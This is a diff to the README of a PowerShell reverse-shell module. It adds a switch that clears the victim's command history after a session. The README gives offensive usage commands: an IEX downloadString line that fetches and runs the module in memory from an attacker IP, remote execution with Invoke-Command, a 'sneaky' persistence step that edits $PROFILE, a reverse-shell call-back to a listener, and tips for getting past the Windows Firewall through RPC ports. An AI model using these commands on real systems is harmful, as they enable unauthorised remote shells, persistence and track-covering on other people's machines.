@@ -30,7 +30,7 @@ Import-Module .\ReversePowerShell.psm1
 
 If your are able to use Invoke-Expresion (IEX) this module can be imported using the following command.
 You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run.
-Notice the .ps1 extension. When using downloadString this will need to be a ps1 file to inject the module into 
+Notice the .ps1 extension. When using downloadString this will need to be a ps1 file to inject the module into
 memory in order to run the cmdlets.
 ```powershell
 IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker ipv4>/ReversePowerShell.ps1")
@@ -40,14 +40,14 @@ IEX is blocked from users in most cases and Import-Module is monitored by things
 ```powershell
 Invoke-Command -ComputerName <target device> -FilePath .'\ReversePowerShell.ps1m' -Credential (Get-Credential)
 ```
-This will execute the file and it's contents on the remote computer. 
+This will execute the file and it's contents on the remote computer.
 
 Another sneaky method would be to have the function load at the start of a new PowerShell window. This can be done by editing the $PROFILE file.
 ```powershell
 Write-Verbose "Creates powershell profile for user"
 New-Item -Path $PROFILE -ItemType File -Force
 #
-# The $PROFILE VARIABLE IS EITHER GOING TO BE 
+# The $PROFILE VARIABLE IS EITHER GOING TO BE
 #    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
 # OR
 #    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
@@ -81,9 +81,11 @@ Start-Listener -Port 8089
 The below command is to be issued on the Target Machine. The below command connected to the listener over
 port 8089. This will not be able to complete a connection to the Start-Bind cmdlet.
 If a connection failes a loop will be started that begins a 30 second visual countdown timer.
-After 30 seconds the connection will attempt to re-establish the shell.
+After 30 seconds the connection will attempt to re-establish the shell. I added a switch parameter
+to attempt clearing the command history of the user after closing a session. This was added for cases
+where a compromised password is going to be entered into the PowerShell terminal in clear text.
 ```powershell
-Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089
+Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089 -ClearHistory
 ```
 ---
 # MISC INFO
@@ -91,7 +93,7 @@ Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089
 If you are not able to gain a connection it is most likely due to the Windows Firewall. If you have access on a machine as a user you will not be able to make firewall changes. You need admin priviledges for that. Use the high range ports RPC would connect to or other common port. If a range has been defined you can find the allowed ports at "HKLM:\Software\Microsoft\Rpc\Internet\ with Entry name Data Type". Otherwise when not defined any ports between 49152-65535 might work.
 This command may also display the port allowed RPC port range
 ```cmd
-netsh int ipv4 show dynamicport tcp 
+netsh int ipv4 show dynamicport tcp
 ```
 
 The following commands can be used to view firewall rules. If one of these does not work.
